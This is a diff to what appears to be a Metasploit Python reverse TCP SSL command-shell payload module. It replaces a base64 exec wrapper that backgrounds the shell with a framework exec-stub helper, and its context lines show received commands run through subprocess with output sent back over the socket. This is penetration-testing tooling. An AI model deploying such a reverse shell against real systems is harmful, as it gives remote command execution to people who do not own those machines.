@@ -4,14 +4,16 @@
 ##
 
 require 'msf/core/handler/reverse_tcp_ssl'
+require 'msf/core/payload/python'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 587
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -61,12 +63,6 @@ module MetasploitModule
     cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-
-    # The *nix shell wrapper to keep things clean
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "python -c \"exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))\""
-    cmd += ' >/dev/null 2>&1 &'
-    return cmd
-
+    "python -c \"#{ py_create_exec_stub(cmd) }\""
   end
 end
